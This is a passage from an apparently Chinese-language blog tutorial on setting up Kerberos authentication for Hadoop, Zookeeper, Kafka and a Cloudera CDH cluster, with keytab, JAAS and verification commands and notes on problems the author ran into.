class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dfs.name.dir/ hdfs:hadoop</span><br><span class="line">dfs.data.dir/ hdfs:hadoop</span><br><span class="line">mapred.local.dir/ mapred:hadoop</span><br><span class="line">mapred.system.dir in HDFS/ mapred:hadoop</span><br><span class="line">yarn.nodemanager.local-dirs/ yarn:yarn</span><br><span class="line">yarn.nodemanager.log-dirs/ yarn:yarn</span><br><span class="line">oozie.service.StoreService.jdbc.url (if using Derby)/ oozie:oozie</span><br><span class="line">[[database]] name/ hue:hue</span><br><span class="line">javax.jdo.option.ConnectionURL/ hue:hue</span><br></pre></td></tr></table></figure><p>启动NameNode</p><p>启动之前必须确保JCE jar已经替换，首先检查JSVC</p><p>首先master节点查看是否安装了JSVC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /usr/lib/bigtop-utils/</span><br><span class="line">bigtop-detect-classpath  bigtop-detect-javahome  bigtop-detect-javalibs  jsvc</span><br></pre></td></tr></table></figure><p>然后编辑<code>/etc/default/hadoop-hdfs-datanode</code>，取消对下面注释并添加一行JSVC_HOME，修改如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export HADOOP_SECURE_DN_USER=hdfs</span><br><span class="line">export HADOOP_SECURE_DN_PID_DIR=/var/run/hadoop-hdfs</span><br><span class="line">export HADOOP_SECURE_DN_LOG_DIR=/var/log/hadoop-hdfs</span><br><span class="line">export JSVC_HOME=/usr/lib/bigtop-utils</span><br></pre></td></tr></table></figure><p>hadoop-hdfs-datanode同步到其他节点</p><p>随后分别在CDH2、CDH3获取ticket然后启动服务</p><p>#root为root/admin密码</p><p><code>kinit -k -t /etc/hadoop/conf/hdfs.keytab hdfs/master@JIMI.COM; service hadoop-hdfs-datanode start</code></p><p>（这仅仅为master节点上的操作，别的节点类似）</p><p>观察master上的Namenode日志，出现下面的日志表名Datanode启动成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">14/11/04 17:21:41 INFO security.UserGroupInformation:</span><br><span class="line">Login successful for user hdfs/cdh2@JAVACHEN.COM using keytab file /etc/hadoop/conf/hdfs.keytab</span><br></pre></td></tr></table></figure><p>Tips:</p><ul><li><p>配置 hosts，hostname 请使用小写</p></li><li><p>确保 kerberos 客户端和服务端连通</p></li><li><p>替换 JRE 自带的 JCE jar 包</p></li><li><p>为 DataNode 设置运行用户并配置 JSVC_HOME</p></li><li><p>启动服务前，先获取 ticket 再运行相关命令</p></li></ul><p>Quote:</p><p><a href="https://www.cloudera.com/documentation/enterprise/5-12-x/topics/cdh_sg_kerberos_prin_keytab_deploy.html" target="_blank" rel="noopener">CDH官方文档对Kerberos的介绍1</a></p><p><a href="https://blog.cloudera.com/blog/2015/03/how-to-quickly-configure-kerberos-for-your-apache-hadoop-cluster/" target="_blank" rel="noopener">CDH官方文档对Kerberos的介绍2</a></p><p><a href="http://web.mit.edu/~kerberos/krb5-devel/doc/admin/conf_files/krb5_conf.html" target="_blank" rel="noopener">MIT官网的文档</a></p><p><a href="https://docs.oracle.com/cd/E24847_01/html/819-7061/setup-9.html" target="_blank" rel="noopener">Oracle官网对Kerberos的介绍</a></p><hr><h3 id="5-Apach-原生Zookeeper的Kerberos配置及其验证"><a href="#5-Apach-原生Zookeeper的Kerberos配置及其验证" class="headerlink" title="5.Apach 原生Zookeeper的Kerberos配置及其验证"></a>5.Apach 原生Zookeeper的Kerberos配置及其验证</h3><p>Zookeeper的配置分为两个步骤，先配置<code>Server</code>的<code>keytab</code>，再配置<code>Client</code>的<code>keytab</code>,如果<code>zookeeper-client</code> 和 <code>zookeeper-server</code> 安装在同一个节点上，则 <code>java.env</code> 中的 <code>java.security.auth.login.config</code> 参数会被覆盖，这一点从<code>zookeeper-client</code> 命令启动日志可以看出来。</p><p>首先是配置 <code>Zk Server</code></p><p>因为KDC已经配置了，所以KDC不用再配</p><p>第一步直接生成Keytab</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cd /var/kerberos/krb5kdc/</span><br><span class="line">kadmin.local -q "addprinc -randkey zookeeper/master@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey zookeeper/datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey zookeeper/datanode1@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zookeeper.keytab  zookeeper/master@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zookeeper.keytab  zookeeper/datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zookeeper.keytab  zookeeper/datanode1@JIMI.COM "</span><br></pre></td></tr></table></figure><p>将Keytab拷贝到目录<code>/etc/zookeeper/conf</code></p><p>在三个节点上分别执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/zookeeper/conf/;chown zookeeper:hadoop zookeeper.keytab ;chmod 400 *.keytab</span><br></pre></td></tr></table></figure><p>目的是为了控制权限。</p><p>然后修改配置文件</p><p>在三个节点上的zoo.cfg文件中添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">authProvider.1=org.apache.zookeeper.server.auth.SASLAuthenticationProvider jaasLoginRenew=3600000</span><br></pre></td></tr></table></figure><p>然后创建JAAS配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Server &#123;</span><br><span class="line">  com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">  useKeyTab=true</span><br><span class="line">  keyTab="/etc/zookeeper/conf/zookeeper.keytab"</span><br><span class="line">  storeKey=true</span><br><span class="line">  useTicketCache=false</span><br><span class="line">  principal="zookeeper/master@JIMI.COM";</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>三个节点都要有，每个节点里面的principal有点不同</p><p>然后是配置<strong>Zookeeper Client</strong></p><p>还是先生成<code>keytab</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cd /var/kerberos/krb5kdc/</span><br><span class="line">kadmin.local -q "addprinc -randkey zkcli/master@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey zkcli/datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey zkcli/datanode1@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zkcli.keytab  zkcli/master@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zkcli.keytab  zkcli/datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zkcli.keytab  zkcli/datanode1@JIMI.COM "</span><br></pre></td></tr></table></figure><p>拷贝 zkcli.keytab 文件到其他节点的 <code>/etc/zookeeper/conf</code> 目录，并设置权限，分别在master、datanode0、datanode1 上执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/zookeeper/conf/;</span><br><span class="line">chown zookeeper:</span><br><span class="line">hadoop zkcli.keytab ;chmod 400 *.keytab</span><br></pre></td></tr></table></figure><p>由于 <code>keytab</code> 相当于有了永久凭证，不需要提供密码(如果修改 <code>kdc</code> 中的 <code>principal</code> 的密码，则该 <code>keytab</code> 就会失效)，所以其他用户如果对该文件有读权限，就可以冒充 <code>keytab</code> 中指定的用户身份访问 <code>hadoop</code>，所以 <code>keytab</code> 文件需要确保只对 <code>owner</code> 有读权限(0400)</p><p>创建 JAAS 配置文件</p><p>在<code>/etc/zookeeper/conf/</code>创建<code>client-jaas.conf</code>文件，内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Client &#123;</span><br><span class="line">  com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">  useKeyTab=true</span><br><span class="line">  keyTab=&quot;/etc/zookeeper/conf/zkcli.keytab&quot;</span><br><span class="line">  storeKey=true</span><br><span class="line">  useTicketCache=false</span><br><span class="line">  principal=&quot;zkcli@JIMI.COM&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>同步到其他节点，然后在<code>/etc/zookeeper/conf/</code>目录创建或者修改<code>java.env</code>，内容如下</p><p><code>export CLIENT_JVMFLAGS=&quot;-Djava.security.auth.login.config=/etc/zookeeper/conf/client-jaas.conf&quot;</code></p><p>并且同步到别的节点上</p><p>接着是验证：</p><p>启动客户端：<code>zookeeper-client -server master:2181</code></p><p>创建一个<code>znode</code>节点：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[zk: master:2181(CONNECTED) 0] create /znode1 sasl:zkcli@JIMI.COM:cdwra</span><br><span class="line">Created /znode1</span><br></pre></td></tr></table></figure><p>验证该节点是否创建以及其ACL：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[zk: master:2181(CONNECTED) 1] getAcl /znode1</span><br><span class="line">    'world,'anyone</span><br><span class="line">    : cdrwa</span><br></pre></td></tr></table></figure><p>只要能够在一个节点上创建<code>znode</code>，在别的节点上能够显示出来，就说明<code>Zookeeper</code>的<code>kerberos</code>已经配置成功。</p><hr><h3 id="6-Apach原生Kafka的Kerberos配置及其验证"><a href="#6-Apach原生Kafka的Kerberos配置及其验证" class="headerlink" title="6.Apach原生Kafka的Kerberos配置及其验证"></a>6.Apach原生Kafka的Kerberos配置及其验证</h3><p>因为之前的操作已经搭建完了<code>KDC</code>，所以省略了自建<code>Kerberos</code>的步骤</p><p>首先还是为<code>broker</code>每台服务器在<code>Kerberos</code>服务器生成相应的<code>principal</code>和<code>Keytab</code>，将下列命令里生成的<code>kafka.keytab</code>文件分发到对应<code>broker</code>机器的统一位置，比如<code>/etc/kafka.keytab</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">addprinc -randkey kafka/kafkahost1@EXAMPLE.COM</span><br><span class="line">addprinc -randkey kafka/kafkahost2@EXAMPLE.COM</span><br><span class="line">addprinc -randkey kafka/kafkahost3@EXAMPLE.COM</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">xst -norandkey -k /opt/kafkahost1/kafka.keytab kafka/kafkahost1@EXAMPLE.COM</span><br><span class="line">xst -norandkey -k /opt/kafkahost2/kafka.keytab kafka/kafkahost2@EXAMPLE.COM</span><br><span class="line">xst -norandkey -k /opt/kafkahost3/kafka.keytab kafka/kafkahost3@EXAMPLE.COM</span><br></pre></td></tr></table></figure><p>配置kafka server文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">listeners=SASL_PLAINTEXT://:9092</span><br><span class="line">security.inter.broker.protocol=SASL_PLAINTEXT</span><br><span class="line">sasl.mechanism.inter.broker.protocol=GSSAPI</span><br><span class="line">sasl.enabled.mechanisms=GSSAPI</span><br><span class="line">sasl.kerberos.service.name=kafka</span><br><span class="line">super.users=User:kafka</span><br><span class="line">authorizer.class.name=kafka.security.auth.SimpleAclAuthorizer</span><br></pre></td></tr></table></figure><p>KafkaClient模块是为了bin目录下kafka-console-consumer.sh之类的脚本使用的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">KafkaServer &#123;</span><br><span class="line">            com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">            useKeyTab=true</span><br><span class="line">            storeKey=true</span><br><span class="line">            keyTab="/etc/kafka.keytab"</span><br><span class="line">            principal="kafka/kafkahost1@EXAMPLE.COM";</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">KafkaClient &#123;</span><br><span class="line">        com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">        useKeyTab=true</span><br><span class="line">        storeKey=true</span><br><span class="line">        keyTab="/etc/kafka.keytab"</span><br><span class="line">        principal="kafka/kafkahost1@EXAMPLE.COM"</span><br><span class="line">        useTicketCache=true;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>修改bin目录下kafka-run-class.sh，在  exec $JAVA 后面增加kerberos启动参数,然后就可以用正常的脚本启动服务了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.krb5.conf=/etc/krb5.conf -Djava.security.auth.login.config=/opt/kafka/config/kafka_server_jaas.conf</span><br></pre></td></tr></table></figure><p>或者用这个脚本启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">export KAFKA_HEAP_OPTS='-Xmx256M'</span><br><span class="line">export KAFKA_OPTS='-Djava.security.krb5.conf=/etc/krb5.conf -Djava.security.auth.login.confi</span><br><span class="line">g=/etc/kafka/zookeeper_jaas.conf'</span><br><span class="line">bin/zookeeper-server-start.sh config/zookeeper.properties &amp;</span><br><span class="line"></span><br><span class="line">sleep 5</span><br><span class="line"></span><br><span class="line">export KAFKA_OPTS='-Djava.security.krb5.conf=/etc/krb5.conf -Djava.security.auth.login.confi</span><br><span class="line">g=/etc/kafka/kafka_server_jaas.conf'</span><br><span class="line">bin/kafka-server-start.sh config/server.properties</span><br></pre></td></tr></table></figure><p>最终的目的都是一样</p><p>客户端脚本使用</p><p>启用kerberos后，部分kafka管理脚本需要增加额外的参数才能使用</p><p>首先建立配置文件<code>client.properties</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">security.protocol=SASL_PLAINTEXT</span><br><span class="line">sasl.kerberos.service.name=kafka</span><br><span class="line">sasl.mechanism=GSSAPI</span><br></pre></td></tr></table></figure><p>涉及到的zookeeper.properties</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">authProvider.1=org.apache.zookeeper.server.auth.SASLAuthenticationProvider</span><br><span class="line">requireClientAuthScheme=sasl</span><br><span class="line">jaasLoginRenew=3600000</span><br></pre></td></tr></table></figure><p>所以新命令的使用方式为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-consumer-groups.sh --bootstrap-server kafkahost1:9092 --list --command-config client.properties</span><br><span class="line">bin/kafka-console-producer.sh --broker-list kafkahost1:9092 --topic test --producer.config client.properties</span><br><span class="line">bin/kafka-console-consumer.sh --bootstrap-server kafkahost1:9092 --topic test --consumer.config client.properties</span><br></pre></td></tr></table></figure><p>如果之前JCE的包没有安装好的话会报如下错误，需要把JCE包安装到位即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WARN [Controller-60-to-broker-60-send-thread], Controller 60's connection to broker kafka60:9092 (id: 60 rack: null) was unsuccessful (kafka.controller.RequestSendThread)</span><br><span class="line">java.io.IOException: Connection to kafka60:9092 (id: 60 rack: null) failed</span><br></pre></td></tr></table></figure><p>能在命令行上运行成功命令行消费者和命令行生产者就说明ZK和Kafka的安装基本搞定，没有问题。</p><p>用Java连接集群上的Kerberos组件篇幅较长，涉及代码，另外开一篇文章说明。</p><hr><h3 id="7-Cloudera’s-Distribution-Including-Apache-Hadoop-CDH-上Kerberos的安装"><a href="#7-Cloudera’s-Distribution-Including-Apache-Hadoop-CDH-上Kerberos的安装" class="headerlink" title="7.Cloudera’s Distribution Including Apache Hadoop(CDH)上Kerberos的安装"></a>7.Cloudera’s Distribution Including Apache Hadoop(<em>CDH</em>)上Kerberos的安装</h3><p>CDH上面的Kerberos安装其实已经被简化了，简化的好处是安装方便，坏处是一旦出现问题不知从何处下手。所以对前面单独组件的了解是有必要的。实际操作下来，官网和各技术博客都有些许问题。在此记录。</p><p>首先配置KDC，和单独安装操作相同</p><p>首先KDC还是要配置，在CM服务器上配置KDC</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install krb5-serverkrb5-libs krb5-auth-dialog krb5-workstation</span><br></pre></td></tr></table></figure><p>修改<code>/etc/krb5.conf</code>、<code>/var/kerberos/krb5kdc/kadm5.acl</code>、<code>/var/kerberos/krb5kdc/kdc.conf</code>配置，配置内容相同，不再赘述。</p><p>然后在所有节点上（包括CM）安装Kerberos客户端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install krb5-libs krb5-workstation</span><br></pre></td></tr></table></figure><p>然后在CM节点上独立安装额外的包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install openldap-clients</span><br></pre></td></tr></table></figure><p>分发krb5.conf到另外两个节点</p><p>JCE包还是要记得替换，替换位置：<code>/usr/share/java/jdk1.8.0_144/jre/lib/security</code></p><p>KDC安装完成后，建立测试Kerberos的管理员账号。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5k45t4jj20et03u3yg.jpg" alt="alt admin"></p><hr><p>CM界面 -&gt;管理 -&gt; 安全</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5rgh6faj20o702ut8o.jpg" alt="CDH"></p><p>点击启用</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0ar5zj20pe0o43zp.jpg" alt="CDH1"></p><p>全部勾选即可</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0a7vuj20n00pmt9i.jpg" alt></p><p>这边别的都好理解，都是和host上面对应的，然后这个加密类型是和krb5.conf对应相同的</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v08hypj20k005dgll.jpg" alt></p><p>这上面有张图没截到，是选择是否要通过CM管理的，一般选择不通过</p><p>这边管理账户输入之前创建的管理账户即可。</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0a1fxj20hz05d0ss.jpg" alt></p><p>这边CDH会帮助验证密码</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0ayqyj20mx0oamxv.jpg" alt></p><p>接下来的这个步骤我标红了一块，我在这边spark2的部分，服务范围设置的是spark2，默认是spark，我修改了一下，避免以后的keytab名字出现歧义</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0e6e7j20oc0q1wfz.jpg" alt></p><p>随后，直接勾选重启选项即可</p><p>初步的配置就完成了</p><hr><p><a href="https://docs.huihoo.com/solaris/10/simplified-chinese/html/819-7061/aadmin-3.html#setup-304" target="_blank" rel="noopener">Oracle系统管理指南：安全性服务文档</a></p><p>（包括了备份和传播Kerberos、如何恢复Kerberos、如何在服务器升级后转换Kerberos数据库，如何重新配置主KDC服务器以使用增量传播，如何重新配置从KDC以使用增量传播，如何配置从 KDC 服务器以使用完全传播，如何验证KDC服务器已经同步，如何手动将Kerberos数据库传播到从KDC服务器，设计并行传播，设置并行传播的配置步骤，管理存储文件，如何删除存储文件等。）</p><hr><h3 id="8-对Kerberos的一点使用心得"><a href="#8-对Kerberos的一点使用心得" class="headerlink" title="8.对Kerberos的一点使用心得"></a>8.对Kerberos的一点使用心得</h3><p>CDH的Kerberos其实算是相对好管理的，最起码组件的principal都是CDH自动生成的。</p><p>在KDC上创建完成管理员开启功能之后，我常用的操作有这些：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 登录，通过创建的BDB管理账号管理</span><br><span class="line">kadmin.local</span><br><span class="line"><span class="meta">#</span> 查看现有的账号列表</span><br><span class="line">kadmin.local: listprincs</span><br><span class="line"><span class="meta">#</span> 这边CDH的Principal都是自动生成的，可以直接使用，在服务器上的文件夹里找到对应Keytab就可以登录</span><br><span class="line"><span class="meta">#</span> 找到Principal之后，可以查看Keytab的加密方式 过期时间等等</span><br><span class="line">klist -kt /root/hdfs.keytab</span><br><span class="line">Keytab name: FILE:/root/hdfs.keytab</span><br><span class="line">KVNO Timestamp           Principal</span><br><span class="line">---- ------------------- ------------------------------------------------------</span><br><span class="line">  13 07/03/2018 10:08:10 hdfs/master126@JIMI.COM</span><br><span class="line">  13 07/03/2018 10:08:10 hdfs/master126@JIMI.COM</span><br><span class="line">  13 07/03/2018 10:08:10 hdfs/master126@JIMI.COM</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> Keytab的作用就是获取KDC的ticket</span><br><span class="line">kinit -kt keytab/hdfs.keytab hdfs/master126@JIMI.COM</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 还可以使用klist -e查看现在服务器里缓存的是哪一个ticket</span><br><span class="line">klist -e</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_0</span><br><span class="line">Default principal: hdfs/bigdata25@ZQYKJ.COM</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">07/06/2018 11:24:46  07/07/2018 11:24:46  krbtgt/ZQYKJ.COM@ZQYKJ.COM</span><br><span class="line">renew until 07/11/2018 11:24:46, Etype (skey, tkt): aes128-cts-hmac-sha1-96, aes128-cts-hmac-sha1-96 </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 退出</span><br><span class="line">kdestroy</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 这边还拓展一个很实用的功能 keytab维护工具 ktutil</span><br><span class="line">ktutil</span><br><span class="line"><span class="meta">#</span> 打开之后即进入工具，工具里面我常用的功能包括：rkt（read keytab）</span><br><span class="line"><span class="meta">#</span> 可以将keytab读进来之后然后，生成新的keytab（合并）</span><br><span class="line"><span class="meta">#</span> 然后上面提到的read完成之后，也可以列出 分析 加密方式等等</span><br></pre></td></tr></table></figure><p><a href="https://www.freebsd.org/cgi/man.cgi?query=ktutil" target="_blank" rel="noopener">更多ktutilAPI</a></p><p><a href="https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_71/com.ibm.aix.cmds3/klist.htm" target="_blank" rel="noopener">IBM对BDB数据库命令的介绍</a></p><hr><h3 id="9-如何验证Kerberos已经安装完成"><a href="#9-如何验证Kerberos已经安装完成" class="headerlink" title="9.如何验证Kerberos已经安装完成"></a>9.如何验证Kerberos已经安装完成</h3><p><strong>HDFS</strong><br>登录到某一个节点后，切换到hdfs用户，然后用kinit来获取credentials</p><p>现在用<code>hadoop hdfs -ls /</code>应该能正常输出结果<br>用kdestroy销毁credentials后，再使用<code>hadoop hdfs -ls /</code>会发现报错</p><p><strong>Kafka</strong></p><p>用新的一套API，消费者能正常消费，生产者能正常生产不报错误就算ok</p><p>注意：是新API，开启Kerberos之后老API无法再使用</p><p><strong>Zookeeper</strong></p><p>启动zookeeper：</p><p>Zookeeper-client -server master:2181</p><p>创建一个 znode 节点：</p><p>create /znode1 sasl:<a href="mailto:master@JIMI.com" target="_blank" rel="noopener">master@JIMI.com</a>:cdwra</p><p>在另外的节点上执行 </p><p>getAcl /znode1</p><p>如果能够获取在另外一个节点上输入的输入就证明没有问题</p><hr><h3 id="10-Kerberos遇到的坑"><a href="#10-Kerberos遇到的坑" class="headerlink" title="10.Kerberos遇到的坑"></a>10.Kerberos遇到的坑</h3><h4 id="Kerberos卸载BUG"><a href="#Kerberos卸载BUG" class="headerlink" title="Kerberos卸载BUG"></a>Kerberos卸载BUG</h4><p>Linux上的KDC存在严重的卸载BUG，使用<code>yum remove</code>卸载会出现严重的问题</p><p>因为之前<code>principal</code>的认证因为人为操作出现了一些问题，所以用yum remove卸载重新安装了一下，yum remove之后出现了大问题，凡是新连接外部的命令都无法使用，包括并不限于：yum、ssh、wgt等命令，FTP工具也无法使用，这就导致了无法连接外部下载kdc安装包</p><p>还好我卸载之前连接的SSH窗口没有关闭（新的连接无法建立， 但是已经建立的连接不会断开），用的XSHELL 6，我尝试用XFTP连接，失败，但是XSHELL 6 默认输入框里就有传输文件的功能，上传四个Kerberos文件之后重新安装之后才解决了问题。</p><h4 id="Zookeeper报错"><a href="#Zookeeper报错" class="headerlink" title="Zookeeper报错"></a>Zookeeper报错</h4><p>Zk这个组件启动的时候在互相连接的装一下会报Error，这个Error曾今困扰了我挺久</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2019-02-26 18:37:15,898 WARN org.apache.zookeeper.server.NIOServerCnxn: caught end of stream exception</span><br><span class="line">EndOfStreamException: Unable to read additional data from client sessionid 0x269290a81950073, likely client has closed socket</span><br><span class="line">        at org.apache.zookeeper.server.NIOServerCnxn.doIO(NIOServerCnxn.java:231)</span><br><span class="line">        at org.apache.zookeeper.server.NIOServerCnxnFactory.run(NIOServerCnxnFactory.java:208)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:748)</span><br></pre></td></tr></table></figure><p>其实只要Zk验证了没有问题就行了，这个报错不用纠结</p><h4 id="Kafka启动-关闭Kerberos的坑"><a href="#Kafka启动-关闭Kerberos的坑" class="headerlink" title="Kafka启动/关闭Kerberos的坑"></a>Kafka启动/关闭Kerberos的坑</h4><p>CDH集群中为Kafka启用Kerberos需要些配置之外的操作，启用Kerberos的时候容易忽略这些细节，导致kafka开启不正确， 然后关闭的时候容易把这些操作忽略了，导致关闭不彻底，在有的环节仍然关闭了Kerberos。</p><p>Kafka在CDH中的配置需要先登录CM进入kafka服务，修改<code>ssl.client.auth</code>为none，这届两个Kerberos相关的配置设为开启，接下来还要修改security.inter.broker.protocol配置为SASL_PLAINTEXT，保存以上修改的配置后，回到主页根据提示重启kafka Server,接下来就是在客户端上的配置，本身CDH就会为了Kafka生成配置文件jaas.conf，对于这个配置文件真实一言难尽，里面的配置文件会有 不起眼的错误（是关于KafkaClient和KafkaServer混淆的错误），这一个改正完毕，还有一个配置文件client.properties文件，两个文件设置完毕后，在<code>/etc/profile</code>里面设置环境变量<code>exportKAFKA_OPTS=&quot;-Djava.security.krb5.conf=/etc/krb5.conf-Djava.security.auth.login.config=/opt/kafka/kafka_client.jaas&quot;</code>，配置完毕kafka这块，关闭的时候容易忘记，必须要记得从profile中删除才行。</p><h4 id="Flume配置文件导致文件无限传输"><a href="#Flume配置文件导致文件无限传输" class="headerlink" title="Flume配置文件导致文件无限传输"></a>Flume配置文件导致文件无限传输</h4><p>Flume的配置文件出了错误，因为对Flume的KafkaChannel的不熟悉</p><p>配置的时候把Channel的sink又连接到Source上导致了数据一致循环。。。</p><p>排查之后发现了这个问题，附上Flume的配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 